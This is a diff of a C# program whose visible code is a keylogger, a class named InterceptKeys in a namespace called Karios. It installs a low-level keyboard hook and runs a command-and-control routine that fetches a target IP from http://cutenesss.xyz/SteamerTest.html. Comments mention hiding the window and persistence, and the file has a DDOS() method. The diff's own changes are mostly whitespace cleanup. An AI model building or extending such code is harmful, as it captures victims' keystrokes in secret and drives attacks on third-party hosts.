@@ -15,8 +15,6 @@ using System.Net.Sockets;
 
 namespace Karios
 {
-
-
     class InterceptKeys
     {
         private const int WH_KEYBOARD_LL = 13;
@@ -25,20 +23,17 @@ namespace Karios
         private static IntPtr _hookID = IntPtr.Zero;
         private static string LocalIP;
         private static string GlobalTargetIP;
+        
         public static void Main()
         {
             var handle = GetConsoleWindow();
-
             //start C&C func
-
             using (WebClient wc = new WebClient())
             {
                 try
                 {
                     string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
                     if (!webData.ToUpperInvariant().Contains("Keyonline"))
-                    
-
                     // Hide the window
                     //ShowWindow(handle, SW_HIDE);
                     // Persitance feature
@@ -57,14 +52,10 @@ namespace Karios
                         // IPTarget = IP on cutenesss.xyz/SteamerTest.html
                         IPTarget = GlobalTargetIP;
                     }
-
-
                 }
                 catch { }
             }
         }
-
-
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -76,11 +67,9 @@ namespace Karios
             }
         }
 
-        private delegate IntPtr LowLevelKeyboardProc(
-            int nCode, IntPtr wParam, IntPtr lParam);
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        private static IntPtr HookCallback(
-            int nCode, IntPtr wParam, IntPtr lParam)
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
@@ -195,6 +184,7 @@ namespace Karios
                 }
             }
         }
+
         public static void DDOS()
         {
             using (WebClient wc = new WebClient())
@@ -234,8 +224,4 @@ namespace Karios
 
         const int SW_HIDE = 0;
     }
-}    
-
-
-
-    
+}
